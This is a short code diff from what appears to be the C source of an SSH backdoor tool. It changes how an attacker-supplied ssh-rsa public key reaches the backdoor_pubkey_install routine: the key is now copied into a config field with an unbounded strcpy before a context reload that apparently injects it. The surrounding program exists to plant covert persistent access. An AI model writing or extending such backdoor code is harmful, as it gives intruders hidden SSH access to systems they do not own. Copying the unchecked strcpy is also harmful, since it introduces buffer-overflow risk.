@@ -168,13 +168,17 @@ int main(int argc, char *argv[]) {
 				error("invalid pubkey specified, we only support ssh-rsa for now");
 			}
 
-			backdoor_pubkey_install(ctx, keybuf);
+			strcpy(config->pubkey, keybuf);
+
+			backdoor_pubkey_install(ctx);
 		} else {
 			if(strncmp(pubkey_value, "ssh-rsa", 7) != 0) {
 				error("invalid pubkey specified, we only support ssh-rsa for now");
 			}
 
-			backdoor_pubkey_install(ctx, pubkey_value);
+			strcpy(config->pubkey, pubkey_value);
+
+			backdoor_pubkey_install(ctx);
 		}
 
 		inject_ctx_map_reload(ctx);
